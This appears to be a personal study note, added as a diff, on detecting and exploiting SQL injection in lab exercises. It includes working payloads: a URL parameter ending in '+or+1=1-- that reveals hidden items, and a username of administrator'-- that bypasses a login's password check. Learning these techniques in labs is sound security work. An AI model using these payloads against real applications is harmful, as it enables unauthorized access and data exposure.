@@ -1,0 +1,19 @@
+The single quote character ' and look for errors or other anomalies.
+Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
+Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses. 
+
+
+The Lab:
+
+At URL -> where it ends "category=" delete everyhting until = and add " '+or+1=1--" and press enter -> you will get all the items that are even hidden 
+
+Second Lab:
+
+Add at Username ' and a random password -> we get an internal server error
+-> make a SQl string : SELECT firstname FROM users where username='admin' and password='admin'
+
+SELECT firstname FROM users where username='administrator'--' and password='admin'
+
+SELECT firstname FROM users where username='administrator'--
+
+-> copypaste administrator'-- for username and you can login without the password
